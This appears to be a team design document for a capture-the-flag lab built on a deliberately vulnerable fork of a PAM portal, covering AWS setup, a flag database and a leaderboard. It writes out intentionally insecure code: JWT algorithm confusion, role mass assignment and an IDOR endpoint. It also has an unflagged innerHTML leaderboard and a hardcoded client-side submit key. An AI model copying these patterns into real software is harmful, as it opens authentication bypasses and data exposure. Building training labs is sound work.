### What Changes vs Production SecureGate

The CTF PAM is a fork, not a rewrite. Approximately 90% of the code is identical to the production PAM. Only specific, targeted changes are made to inject vulnerabilities and add CTF-specific features.

| Component | Production PAM | CTF PAM | Change |
|---|---|---|---|
| Next.js app | Same | Same | No change |
| `lib/auth.ts` | Strict RS256 only | Accepts HS256 via algorithm confusion | **MODIFIED** |
| `/app/api/register` | Does not exist | Unauthenticated endpoint with mass assignment | **NEW** |
| `/.well-known/jwks.json` | Does not exist | Exposes RSA public key | **NEW** |
| `/app/api/audit/sessions/user/[uid]` | Does not exist | IDOR endpoint | **NEW** |
| `/app/api/ctf/submit` | Does not exist | Flag submission + score recording | **NEW** |
| `Nginx config` | Strips `X-Powered-By` | Leaves `X-Powered-By` intact | **MODIFIED** |
| `GUARDIAN_TARGET_HOST` | Production MySQL EC2 private IP | CTF-MySQL EC2 private IP | **MODIFIED** |
| Vault seed | Production SSH creds | CTF-MySQL pamuser SSH creds | **MODIFIED** |
| PostgreSQL seed | 3 demo users | 20–24 participant accounts | **MODIFIED** |

### Leaderboard Tech Stack

The leaderboard is a static HTML page that polls a lightweight API endpoint. The API is served by the CTF PAM itself (one more route in the same Next.js app) and reads from MongoDB.

```
Player submits flag
        │
        ▼
POST /api/ctf/submit { flag, participantEmail }
        │
        ├── Verify flag string matches expected value
        ├── Check participant has not already submitted (idempotent)
        ├── Record to MongoDB: { email, timestamp, stage, points }
        └── Return { success: true, message: "Flag accepted!" }

Leaderboard page (apt-lore.duckdns.org/leaderboard.html)
        │
        └── Every 10 seconds: GET /api/ctf/scores
                │
                └── MongoDB aggregate → sorted by points DESC, then timestamp ASC
                    Returns [{ email, points, solvedAt }]
                    Page renders table with live updates
```

**Score protection:** The submit endpoint requires a `X-CTF-Submit-Key` header with a value known only to the team and embedded in the submit form. This prevents players from directly hitting the API with arbitrary flag strings and avoids brute-force flag submission. The key is a random 32-byte hex string generated at setup and hardcoded in both the form and the server.

---

## 8. Project Phases — Overview

```mermaid
timeline
    title CTF Implementation Timeline
    Week 0 : Phase 0
           : AWS Bootstrap
           : All members
    Week 1 : Phase 1
           : CTF PAM Fork
           : Member 2
    Week 1–2 : Phase 2
             : MySQL EC2 & Flag DB
             : Member 3
    Week 2 : Phase 3
           : Lore Page & Leaderboard
           : Member 1
    Week 2 : Phase 4
           : Onboarding Pipeline
           : Member 2
    Week 2–3 : Phase 5
             : Hardening & Isolation
             : Member 3
    Week 3 : Phase 6
           : Full Integration & Attack Testing
           : All members
```

| Phase | Name | Owner | Output |
|---|---|---|---|
| 0 | AWS Bootstrap | All | VPC, subnets, Security Groups, all four EC2s running, DuckDNS configured |
| 1 | CTF PAM Fork | Member 2 | Vulnerable PAM running on CTF-PAM EC2, all four vulnerabilities injected and verified |
| 2 | MySQL EC2 & Flag DB | Member 3 | CTF-MySQL EC2 configured, flag table seeded, pamuser SSH access working |
| 3 | Lore Page & Leaderboard | Member 1 | Static site live at `apt-lore.duckdns.org`, leaderboard polling, flag submission working |
| 4 | Onboarding Pipeline | Member 2 | Bulk account creation script, credential email template, 24 test accounts created |
| 5 | Hardening & Isolation | Member 3 | Security Groups locked, CTF-MySQL unreachable from internet, Production PAM isolated |
| 6 | Integration & Attack Test | All | Full attack chain validated end-to-end by team members playing as participants |

---

## 9. Phase 0 — AWS Bootstrap (Day 1, All Members)

### Purpose

Before any code is written, all infrastructure must exist. Phase 0 is the only phase where all three members work together. The goal: end the day with four EC2 instances running, all reachable via SSH from team IPs, DuckDNS subdomains resolving, and Security Groups in their initial configuration (to be tightened in Phase 5).

### Step-by-Step AWS Setup

**Step 1 — Create the VPC**

In AWS Console → VPC → Create VPC:
- Name: `securegate-ctf-vpc`
- IPv4 CIDR: `10.0.0.0/16`
- No IPv6
- Tenancy: Default

**Step 2 — Create Subnets**

Create two subnets inside the VPC:

Public Subnet:
- Name: `ctf-public-subnet`
- Availability Zone: `us-east-1a`
- CIDR: `10.0.0.0/24`

Private Subnet:
- Name: `ctf-private-subnet`
- Availability Zone: `us-east-1a`
- CIDR: `10.0.1.0/24`

**Step 3 — Internet Gateway**

Create an Internet Gateway named `ctf-igw`. Attach it to `securegate-ctf-vpc`.

In the Route Table for the Public Subnet:
- Add route: `0.0.0.0/0` → `ctf-igw`

The Private Subnet gets no route to the Internet Gateway. The CTF-MySQL EC2 has no internet access — by design.

**Step 4 — Create Security Groups**

Create three Security Groups (initial, permissive — tightened in Phase 5):

`SG-CTF-PAM`:
- Inbound: Port 22 from team member home IPs (each team member adds their own IP)
- Inbound: Port 80 from 0.0.0.0/0
- Inbound: Port 443 from 0.0.0.0/0
- Outbound: All traffic

`SG-CTF-MySQL`:
- Inbound: Port 22 from `SG-CTF-PAM` (not an IP — reference the Security Group itself)
- Inbound: Port 3306 from `SG-CTF-PAM`
- Outbound: None (explicitly remove the default all-outbound rule)

`SG-Lore-Nginx`:
- Inbound: Port 22 from team member home IPs
- Inbound: Port 80 from 0.0.0.0/0
- Outbound: All traffic

**Step 5 — Generate SSH Key Pairs**

Generate one key pair for team management access to all EC2s:
- AWS Console → EC2 → Key Pairs → Create Key Pair
- Name: `ctf-team-key`
- Type: ED25519
- Format: `.pem`
- Download and store securely — share between team members over Signal, not email

**Step 6 — Launch EC2 Instances**

Launch CTF-PAM EC2:
- AMI: Ubuntu 22.04 LTS (64-bit x86)
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-public-subnet`
- Auto-assign public IP: Enabled
- Security Group: `SG-CTF-PAM`
- Key pair: `ctf-team-key`
- Storage: 20 GB gp3
- Name tag: `CTF-PAM`

Launch CTF-MySQL EC2:
- AMI: Ubuntu 22.04 LTS
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-private-subnet`
- Auto-assign public IP: **Disabled**
- Security Group: `SG-CTF-MySQL`
- Key pair: `ctf-team-key`
- Storage: 8 GB gp3
- Name tag: `CTF-MySQL`

Launch Lore-Nginx EC2:
- AMI: Ubuntu 22.04 LTS
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-public-subnet`
- Auto-assign public IP: Enabled
- Security Group: `SG-Lore-Nginx`
- Key pair: `ctf-team-key`
- Storage: 8 GB gp3
- Name tag: `Lore-Nginx`

> [!info] Reaching the CTF-MySQL EC2
> The CTF-MySQL EC2 has no public IP. Team members cannot SSH into it directly from their laptops. To reach it for setup, SSH into the CTF-PAM EC2 first, then SSH from there to the CTF-MySQL private IP. This is called a **jump host** or **bastion** pattern. Command: `ssh -J ubuntu@<ctf-pam-public-ip> ubuntu@10.0.1.50`

**Step 7 — DuckDNS Setup**

Register two subdomains at `duckdns.org`:
- `ctf-pam` → CTF-PAM EC2 public IP
- `apt-lore` → Lore-Nginx EC2 public IP

Install cron job on both public EC2s:

```bash
# Run on both CTF-PAM and Lore-Nginx
echo "*/5 * * * * root curl -s 'https://www.duckdns.org/update?domains=<subdomain>&token=<your-token>&ip=' > /tmp/duckdns.log 2>&1" | sudo tee /etc/cron.d/duckdns
sudo chmod 644 /etc/cron.d/duckdns
```

Verify within 5 minutes: `nslookup ctf-pam.duckdns.org` should return the EC2's public IP.

**Step 8 — Install Base Software on All EC2s**

Run on CTF-PAM EC2:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y docker.io docker-compose-v2 nginx certbot python3-certbot-nginx git curl
sudo usermod -aG docker ubuntu
sudo systemctl enable nginx
sudo systemctl enable docker
```

Run on Lore-Nginx EC2:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y nginx curl
sudo systemctl enable nginx
```

Run on CTF-MySQL EC2 (via jump host):

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y mysql-server openssh-server
sudo systemctl enable mysql
sudo systemctl enable ssh
```

### Phase 0 Deliverables

- [ ] VPC, two subnets, Internet Gateway, route tables configured
- [ ] Three Security Groups created with initial rules
- [ ] All three CTF EC2 instances running and reachable via SSH
- [ ] `ctf-pam.duckdns.org` resolves to CTF-PAM public IP
- [ ] `apt-lore.duckdns.org` resolves to Lore-Nginx public IP
- [ ] DuckDNS cron job installed on both public EC2s
- [ ] Base software installed on all three instances
- [ ] All three members can SSH into CTF-PAM and Lore-Nginx directly, and into CTF-MySQL via jump host

---

## 10. Phase 1 — CTF PAM Fork & Vulnerability Injection (Member 2)

### Purpose

Create the intentionally vulnerable version of SecureGate PAM and deploy it to the CTF-PAM EC2. This is the core of the CTF — every challenge stage depends on vulnerabilities living here.

### Step 1 — Fork the Repository

```bash
# On Member 2's local machine
git clone https://github.com/MuhammadAbdullahSalahuddin/SecureGate ctf-pam
cd ctf-pam
git remote set-url origin https://github.com/<your-org>/ctf-pam
git push -u origin main
```

Create a `ctf/vulnerable` branch — all vulnerability injections happen here, never on `main`:

```bash
git checkout -b ctf/vulnerable
```

### Step 2 — Inject Vulnerability 1: Algorithm Confusion in `lib/auth.ts`

Replace the `verifyAccessToken` function with a version that accepts both RS256 and HS256:

```typescript
// VULNERABLE version — for CTF use only
// This allows HS256 tokens signed with the RSA public key to be accepted
export async function verifyAccessToken(token: string) {
  // Decode the header without verification to get the algorithm
  const [headerB64] = token.split('.');
  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString());
  const alg = header.alg ?? 'RS256';

  if (alg === 'HS256') {
    // VULNERABLE: use the RSA public key as an HMAC secret
    // An attacker who has the public key (from /jwks.json) can forge tokens
    const publicKeyStr = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
    const secret = new TextEncoder().encode(publicKeyStr);
    const { payload } = await jwtVerify(token, secret);
    return payload;
  } else {
    // Normal RS256 path (for legitimate user tokens)
    const publicKey = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
    const key = await importSPKI(formatPublicKey(publicKey), 'RS256');
    const { payload } = await jwtVerify(token, key);
    return payload;
  }
}
```

### Step 3 — Inject Vulnerability 2: JWKS Endpoint in `/app/api/.well-known/jwks.json/route.ts`

Create a new route that exposes the RSA public key in standard JWKS format:

```typescript
import { NextResponse } from 'next/server';
import { importSPKI, exportJWK } from 'jose';

export async function GET() {
  const publicKeyPem = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
  const key = await importSPKI(publicKeyPem, 'RS256');
  const jwk = await exportJWK(key);

  return NextResponse.json({
    keys: [{
      ...jwk,
      use: 'sig',
      alg: 'RS256',
      kid: 'securegate-2025',
    }],
  });
}
```

### Step 4 — Inject Vulnerability 3: Mass Assignment in `/app/api/register/route.ts`

Create a new unauthenticated registration endpoint:

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { pool } from '@/lib/db';
import bcrypt from 'bcrypt';

export async function POST(request: NextRequest) {
  const body = await request.json();
  // VULNERABLE: role is taken directly from client-controlled input
  const { email, password, role } = body;

  if (!email || !password) {
    return NextResponse.json({ message: 'Email and password required' }, { status: 400 });
  }

  // Only basic password length check — no role validation
  if (password.length < 6) {
    return NextResponse.json({ message: 'Password too short' }, { status: 400 });
  }

  const existing = await pool.query(`SELECT id FROM users WHERE email = $1`, [email]);
  if (existing.rows.length > 0) {
    return NextResponse.json({ message: 'Email already registered' }, { status: 409 });
  }

  const passwordHash = await bcrypt.hash(password, 12);
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    const userResult = await client.query(
      `INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id`,
      [email, passwordHash]
    );
    // VULNERABLE: role from body is used directly without validation
    const finalRole = role ?? 'OPERATOR';
    await client.query(
      `INSERT INTO user_roles (user_id, role_id)
       SELECT $1, r.id FROM roles r WHERE r.name = $2`,
      [userResult.rows[0].id, finalRole]
    );
    await client.query('COMMIT');
    return NextResponse.json({ message: 'Account created. Please log in.' }, { status: 201 });
  } catch {
    await client.query('ROLLBACK');
    return NextResponse.json({ message: 'Registration failed' }, { status: 500 });
  } finally {
    client.release();
  }
}
```

### Step 5 — Inject Vulnerability 4: IDOR in `/app/api/audit/sessions/user/[uid]/route.ts`

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { requireRole } from '@/lib/rbac';
import { getAuditDb } from '@/lib/mongo';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ uid: string }> }
) {
  // Auth check exists — but does not enforce that uid matches the caller
  const auth = await requireRole(request, ['ADMIN', 'OPERATOR', 'AUDITOR']);
  if (auth instanceof NextResponse) return auth;

  const { uid } = await params;
  // VULNERABLE: uid from URL is used directly — any authenticated user can
  // request any other user's sessions by changing the uid parameter
  const db = await getAuditDb();
  const sessions = await db.collection('audit_events')
    .aggregate([
      { $match: { type: { $in: ['session_start', 'session_end'] }, userId: uid } },
      {
        $group: {
          _id: '$sessionId',
          sessionId: { $first: '$sessionId' },
          startedAt: { $min: '$timestamp' },
          endedAt: { $max: { $cond: [{ $eq: ['$type', 'session_end'] }, '$timestamp', null] } },
        }
      },
      { $sort: { startedAt: -1 } },
    ]).toArray();

  return NextResponse.json({ sessions, userId: uid });
}
```

### Step 6 — Add Flag Submission Endpoint `/app/api/ctf/submit/route.ts`

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { getAuditDb } from '@/lib/mongo';

const CORRECT_FLAG = process.env.CTF_FLAG ?? 'CTF{jwt_alg_confusion_pam_pwned_2025}';
const SUBMIT_KEY   = process.env.CTF_SUBMIT_KEY ?? '';

export async function POST(request: NextRequest) {
  // Prevent direct API abuse — submission form embeds this key
  const submitKey = request.headers.get('X-CTF-Submit-Key');
  if (!submitKey || submitKey !== SUBMIT_KEY) {
    return NextResponse.json({ message: 'Forbidden' }, { status: 403 });
  }

  const { flag, email } = await request.json();
  if (!flag || !email) {
    return NextResponse.json({ message: 'flag and email required' }, { status: 400 });
  }

  const db = await getAuditDb();
  const existing = await db.collection('ctf_scores').findOne({ email });
  if (existing) {
    return NextResponse.json({ message: 'Already submitted', alreadySolved: true });
  }

  if (flag.trim() !== CORRECT_FLAG) {
    return NextResponse.json({ message: 'Incorrect flag', correct: false });
  }

  await db.collection('ctf_scores').insertOne({
    email,
    flag,
    solvedAt: new Date(),
    points: 100,
  });

  return NextResponse.json({ message: 'Correct! Flag accepted.', correct: true });
}

export async function GET(request: NextRequest) {
  // Public scores endpoint — leaderboard polls this
  const db = await getAuditDb();
  const scores = await db.collection('ctf_scores')
    .find({})
    .sort({ points: -1, solvedAt: 1 })
    .toArray();
  return NextResponse.json({ scores });
}
```

### Step 7 — Modify Nginx Config to Leave Headers Intact

On CTF-PAM EC2, edit the Nginx config to NOT strip `X-Powered-By`:

```nginx
# /etc/nginx/sites-available/ctf-pam
server {
    listen 80;
    server_name ctf-pam.duckdns.org;

    # Deliberately NOT adding: proxy_hide_header X-Powered-By;
    # The header leaks "Next.js" to players — this is intentional for Stage 1

    location / {
        proxy_pass         http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host $host;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }
}
```

### Step 8 — Update `.env` for CTF

Add CTF-specific variables to `.env` on CTF-PAM EC2:

```bash
# CTF-specific additions to .env
GUARDIAN_TARGET_HOST=10.0.1.50   # CTF-MySQL private IP (set by Member 3)
CTF_FLAG=CTF{jwt_alg_confusion_pam_pwned_2025}
CTF_SUBMIT_KEY=<random 32-byte hex generated at setup>
NODE_ENV=production
```

### Step 9 — Deploy to CTF-PAM EC2

```bash
# On CTF-PAM EC2
git clone https://github.com/<your-org>/ctf-pam /home/ubuntu/ctf-pam
cd /home/ubuntu/ctf-pam
cp .env.example .env
# Edit .env with production values
docker compose up -d --build
```

### Phase 1 Deliverables

- [ ] `ctf/vulnerable` branch contains all four vulnerability injections
- [ ] CTF PAM running on CTF-PAM EC2 (`http://ctf-pam.duckdns.org` loads)
- [ ] `/.well-known/jwks.json` returns a valid JWKS document
- [ ] `POST /api/register` with `role: "ADMIN"` creates an admin account
- [ ] Algorithm confusion attack verified: a token signed with HS256 using the public key is accepted
- [ ] IDOR verified: OPERATOR can fetch another user's sessions via `/api/audit/sessions/user/<other-id>`
- [ ] Flag submission returns `correct: true` for the correct flag string
- [ ] `X-Powered-By: Next.js` appears in response headers

---

## 11. Phase 2 — Flag Database & MySQL EC2 (Member 3)

### Purpose

Configure the CTF-MySQL EC2 as the final target. It must have MySQL running with the flag, a `pamuser` SSH account, convincing decoy data, and zero internet access.

### Step 1 — Configure MySQL

Connect via jump host: `ssh -J ubuntu@<ctf-pam-ip> ubuntu@10.0.1.50`

```bash
sudo mysql_secure_installation
# Follow prompts: set root password, remove anonymous users, disable remote root login
```

Open MySQL as root:

```sql
-- Create the databases
CREATE DATABASE employees;
CREATE DATABASE hr_archive;
CREATE DATABASE financial_records;
CREATE DATABASE secret_ops;

-- Create the pamuser database account (for PAM auto-login)
CREATE USER 'pamuser'@'localhost' IDENTIFIED BY '<strong-password>';
GRANT SELECT ON employees.* TO 'pamuser'@'localhost';
GRANT SELECT ON hr_archive.* TO 'pamuser'@'localhost';
GRANT SELECT ON financial_records.* TO 'pamuser'@'localhost';
GRANT SELECT, INSERT ON secret_ops.* TO 'pamuser'@'localhost';
FLUSH PRIVILEGES;
```

### Step 2 — Create Decoy Data

```sql
-- employees database — realistic but fake
USE employees;
CREATE TABLE staff (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  full_name  VARCHAR(100),
  department VARCHAR(50),
  salary     DECIMAL(10,2),
  hire_date  DATE,
  ssn_last4  CHAR(4)
);

INSERT INTO staff (full_name, department, salary, hire_date, ssn_last4) VALUES
  ('Sarah Mitchell',    'Engineering',  95000.00, '2019-03-15', '4821'),
  ('James Okonkwo',    'Marketing',    72000.00, '2020-07-22', '3356'),
  ('Priya Sharma',     'Finance',      88000.00, '2018-11-30', '7743'),
  ('Carlos Mendez',    'Engineering', 102000.00, '2017-06-01', '9912'),
  ('Anna Kowalski',    'HR',           65000.00, '2021-01-10', '5581'),
  -- ... (add 20–30 more rows for realism)
  ('David Chen',       'Engineering', 115000.00, '2016-04-18', '2247');

-- hr_archive — old records to explore
USE hr_archive;
CREATE TABLE terminated_employees (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  full_name   VARCHAR(100),
  department  VARCHAR(50),
  termination_date DATE,
  reason      VARCHAR(255)
);

INSERT INTO terminated_employees VALUES
  (1, 'Robert Hayes',   'Sales',       '2022-08-15', 'Resignation'),
  (2, 'Mei Tanaka',     'Engineering', '2021-03-30', 'End of contract'),
  (3, 'Omar Al-Rashid', 'Finance',     '2023-01-05', 'Retirement');

-- financial_records — numbers that look sensitive
USE financial_records;
CREATE TABLE quarterly_revenue (
  id        INT AUTO_INCREMENT PRIMARY KEY,
  quarter   VARCHAR(10),
  year      INT,
  revenue   DECIMAL(15,2),
  expenses  DECIMAL(15,2)
);

INSERT INTO quarterly_revenue VALUES
  (1, 'Q1', 2023, 4250000.00, 3100000.00),
  (2, 'Q2', 2023, 5180000.00, 3450000.00),
  (3, 'Q3', 2023, 4820000.00, 3200000.00),
  (4, 'Q4', 2023, 6340000.00, 4100000.00);
```

### Step 3 — Create the Flag Table

```sql
USE secret_ops;

CREATE TABLE project_codenames (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  codename    VARCHAR(50),
  description VARCHAR(255),
  clearance   VARCHAR(20)
);

INSERT INTO project_codenames VALUES
  (1, 'IRON VEIL',    'Network perimeter hardening initiative', 'SECRET'),
  (2, 'BLUE CURTAIN', 'Endpoint detection deployment',         'SECRET'),
  (3, 'ZINC MIRROR',  'Internal audit automation system',      'TOP SECRET');

CREATE TABLE access_tokens (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  service    VARCHAR(100),
  token_hash VARCHAR(255),
  expires_at DATETIME
);

INSERT INTO access_tokens VALUES
  (1, 'internal-api',  SHA2('sup3r-s3cr3t-api-key', 256), '2025-12-31 23:59:59'),
  (2, 'backup-system', SHA2('bkp-k3y-2025',         256), '2025-06-30 23:59:59');

-- THE FLAG TABLE
CREATE TABLE flag (
  id    INT AUTO_INCREMENT PRIMARY KEY,
  value VARCHAR(255) NOT NULL
);

INSERT INTO flag VALUES (1, 'CTF{jwt_alg_confusion_pam_pwned_2025}');
```

### Step 4 — Create pamuser SSH Account

```bash
# On CTF-MySQL EC2
sudo adduser pamuser --disabled-password --gecos ""

# Generate ed25519 key pair FOR THE PAM TO USE
# This is done by Member 3, then the private key is given to Member 2
# for sealing into the CTF PAM vault
sudo -u pamuser ssh-keygen -t ed25519 -f /home/pamuser/.ssh/ctf_pam_key -N ""

# Install the public key as authorized
sudo mkdir -p /home/pamuser/.ssh
sudo cat /home/pamuser/.ssh/ctf_pam_key.pub >> /home/pamuser/.ssh/authorized_keys
sudo chmod 700 /home/pamuser/.ssh
sudo chmod 600 /home/pamuser/.ssh/authorized_keys
sudo chown -R pamuser:pamuser /home/pamuser/.ssh

# The PRIVATE key (/home/pamuser/.ssh/ctf_pam_key) goes to Member 2
# Copy it via: scp (over SSH) or paste over Signal — never email
```

### Step 5 — Restrict pamuser Shell Access

The `pamuser` account should be limited — players who get into the terminal should see MySQL, not a full bash shell where they can explore the entire OS.

```bash
# Create a restricted shell that auto-launches MySQL
sudo tee /usr/local/bin/pamshell.sh << 'EOF'
#!/bin/bash
# Restricted shell for pamuser — auto-connects to MySQL
# Player cannot escape to bash from here
mysql -u pamuser -p'<pamuser-mysql-password>' --prompt="mysql [ctf]> "
EOF
sudo chmod +x /usr/local/bin/pamshell.sh

# Set it as pamuser's shell
sudo usermod -s /usr/local/bin/pamshell.sh pamuser
```

> [!info] Why a Restricted Shell?
> If `pamuser` drops into a full bash shell, a determined player could read `/etc/passwd`, attempt privilege escalation to root, or explore parts of the system that are out of scope. The restricted shell ensures the session is scoped exactly to what Stage 4 requires — database exploration only. This is also realistic: real PAM systems restrict what operators can do even after granting access.

### Step 6 — Update the CTF PAM Vault Seed

Member 3 hands Member 2 the private key. Member 2 updates `docker/seed-vault.ts` in `ctf-pam`:

```typescript
// docker/seed-vault.ts in ctf-pam fork
const creds = {
  ssh: {
    username: 'pamuser',
    privateKey: `-----BEGIN OPENSSH PRIVATE KEY-----
<contents of ctf_pam_key>
-----END OPENSSH PRIVATE KEY-----`,
  },
  db: {
    username: 'pamuser',
    password: '<pamuser-mysql-password>',
  },
}
```

And `tunnel.service.ts` must use `privateKey` instead of `password` for SSH auth (because Ubuntu 22+ uses yescrypt which ssh2 does not support for password auth):

```typescript
conn.connect({
  host:       hostname,
  port:       port ?? 22,
  username:   creds.ssh.username,
  privateKey: creds.ssh.privateKey,  // ed25519 key, not password
  readyTimeout: 10000,
});
```

### Phase 2 Deliverables

- [ ] MySQL 8.0 running on CTF-MySQL EC2
- [ ] Four databases created: `employees`, `hr_archive`, `financial_records`, `secret_ops`
- [ ] Flag table populated: `select * from flag` returns `CTF{jwt_alg_confusion_pam_pwned_2025}`
- [ ] Decoy data in `employees`, `hr_archive`, `financial_records` is convincing (30+ rows)
- [ ] `pamuser` SSH account created with ed25519 key
- [ ] `pamuser` restricted shell auto-launches MySQL on login
- [ ] Private key delivered to Member 2 securely
- [ ] CTF PAM vault seeded with new key-based credentials
- [ ] SSH tunnel from CTF-PAM to CTF-MySQL verified: `ssh -i ctf_pam_key pamuser@10.0.1.50` opens MySQL

---

## 12. Phase 3 — Lore Page, Leaderboard & Nginx EC2 (Member 1)

### Purpose

Build and deploy the static lore site. This is what players see first. It must communicate the scenario convincingly, provide the starting URL, accept flag submissions, and show the live leaderboard.

### Step 1 — Write the Lore Page (`index.html`)

The tone is corporate-professional with subtle signs that "APT Solutions" is fictional. The page must include:

- Company logo (SVG — a stylised lock with "APT Solutions" text)
- The narrative paragraph (see below)
- A clear "Engagement Scope" section listing what is in-scope and out-of-scope
- The target URL as a clickable link: `http://ctf-pam.duckdns.org`
- Navigation to `/leaderboard.html` and `/submit.html`

**Narrative text (adapt as needed):**

> APT Solutions is a mid-sized consulting firm whose internal infrastructure has been flagged by external auditors for critical misconfigurations. The firm recently deployed a Privileged Access Management portal — SecureGate — to protect their employee database server. Preliminary OSINT suggests the portal may contain exploitable vulnerabilities in its authentication and access control layers.
>
> You have been engaged under a time-limited penetration testing contract. Your objective is to gain administrative access to the PAM portal, establish a proxied session to the target database, and retrieve the flag from the `secret_ops` database to confirm the breach scope.
>
> **Target:** `http://ctf-pam.duckdns.org`
> **Starting credentials:** Provided in your onboarding email.

### Step 2 — Leaderboard Page (`leaderboard.html`)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>APT Solutions — CTF Leaderboard</title>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <div class="container">
    <h1>🏆 Leaderboard</h1>
    <p class="subtitle">Updates every 10 seconds</p>
    <div id="board"></div>
  </div>
  <script src="/assets/leaderboard.js"></script>
</body>
</html>
```

`leaderboard.js`:

```javascript
async function refresh() {
  try {
    const res  = await fetch('https://ctf-pam.duckdns.org/api/ctf/scores');
    const data = await res.json();
    const board = document.getElementById('board');

    if (!data.scores || data.scores.length === 0) {
      board.innerHTML = '<p class="empty">No solves yet. Be the first.</p>';
      return;
    }

    board.innerHTML = data.scores.map((s, i) => `
      <div class="row ${i === 0 ? 'first' : ''}">
        <span class="rank">#${i + 1}</span>
        <span class="email">${s.email}</span>
        <span class="points">${s.points} pts</span>
        <span class="time">${new Date(s.solvedAt).toLocaleTimeString()}</span>
      </div>
    `).join('');
  } catch {
    document.getElementById('board').innerHTML = '<p class="error">Unable to reach scoring server.</p>';
  }
}

refresh();
setInterval(refresh, 10_000);
```

### Step 3 — Flag Submission Page (`submit.html`)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>APT Solutions — Submit Flag</title>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <div class="container">
    <h1>Submit Flag</h1>
    <div id="form-area">
      <input type="email" id="email" placeholder="Your email address" />
      <input type="text"  id="flag"  placeholder="CTF{...}" />
      <button onclick="submit()">Submit</button>
    </div>
    <div id="result"></div>
  </div>
  <script>
    const SUBMIT_KEY = '<CTF_SUBMIT_KEY value — hardcoded at deploy time>';

    async function submit() {
      const email = document.getElementById('email').value.trim();
      const flag  = document.getElementById('flag').value.trim();
      if (!email || !flag) { alert('Both fields required'); return; }

      const res = await fetch('https://ctf-pam.duckdns.org/api/ctf/submit', {
        method:  'POST',
        headers: {
          'Content-Type':    'application/json',
          'X-CTF-Submit-Key': SUBMIT_KEY,
        },
        body: JSON.stringify({ flag, email }),
      });
      const data = await res.json();
      document.getElementById('result').textContent = data.message;
    }
  </script>
</body>
</html>
```

### Step 4 — CSS (`style.css`)

Dark, terminal aesthetic — monospace fonts, dark background, green accents. Keep it minimal: the lore should feel like a real corporate security portal, not a flashy game site.

```css
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  background: #0d0d0d;
  color: #c8c8c8;
  font-family: 'Courier New', Courier, monospace;
  min-height: 100vh;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding: 40px 20px;
}

.container {
  max-width: 720px;
  width: 100%;
}

h1 {
  color: #00ff88;
  font-size: 1.8rem;
  margin-bottom: 8px;
  letter-spacing: 2px;
}

.subtitle {
  color: #666;
  font-size: 0.85rem;
  margin-bottom: 24px;
}

.row {
  display: flex;
  gap: 16px;
  padding: 10px 12px;
  border-bottom: 1px solid #1e1e1e;
  align-items: center;
}

.row.first { color: #00ff88; border-left: 3px solid #00ff88; }

.rank   { width: 40px; color: #666; }
.email  { flex: 1; }
.points { width: 80px; text-align: right; }
.time   { width: 100px; color: #666; font-size: 0.8rem; }

input {
  width: 100%;
  padding: 10px;
  margin-bottom: 12px;
  background: #1a1a1a;
  border: 1px solid #333;
  color: #c8c8c8;
  font-family: inherit;
  border-radius: 4px;
}

button {
  padding: 10px 24px;
  background: #00ff88;
  color: #0d0d0d;
  border: none;
  font-family: inherit;
  font-weight: bold;
  cursor: pointer;
  border-radius: 4px;
}

button:hover { background: #00cc66; }
```

### Step 5 — Nginx Config on Lore EC2

```nginx
# /etc/nginx/sites-available/apt-lore
server {
    listen 80;
    server_name apt-lore.duckdns.org;

    root /var/www/apt-lore;
    index index.html;

    # Deliberately add a breadcrumb header for Stage 1
    add_header X-Challenge-Platform "SecureGate-PAM" always;

    location / {
        try_files $uri $uri/ =404;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/apt-lore /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t && sudo systemctl reload nginx
```

### Step 6 — Deploy Script

```bash
#!/usr/bin/env bash
# deploy.sh — run from ctf-lore/ directory
EC2_USER=ubuntu
EC2_IP=<lore-nginx-ec2-public-ip>
KEY=~/.ssh/ctf-team-key.pem

rsync -avz --delete \
  -e "ssh -i $KEY" \
  ./public/ \
  $EC2_USER@$EC2_IP:/var/www/apt-lore/

echo "Deploy complete."
```

### Phase 3 Deliverables

- [ ] `apt-lore.duckdns.org` loads the lore page
- [ ] `X-Challenge-Platform: SecureGate-PAM` header visible in `curl -I` response
- [ ] Leaderboard page polls `/api/ctf/scores` and renders table
- [ ] Submit page sends flag to `/api/ctf/submit` with correct `X-CTF-Submit-Key`
- [ ] Correct flag submission updates leaderboard within 10 seconds
- [ ] Incorrect flag returns "Incorrect flag" without breaking anything

---

## 13. Phase 4 — Onboarding Pipeline & Crew Accounts (Thebe)

> [!warning] Rewritten — this no longer creates PAM accounts
> The original version of this phase created 24 **PAM** (SecureGate) accounts with OPERATOR role and emailed those credentials directly. Under the new design (Section 2), players get **no PAM access at all** up front — PAM accounts are created by players themselves via the Stage 0 mass-assignment endpoint. What this phase now provisions instead is the **crew (lore-site) account** — the `lore_players` login used for the dashboard, Hints tab, and flag submission (Section 18A). This is the only account players are handed before the event.

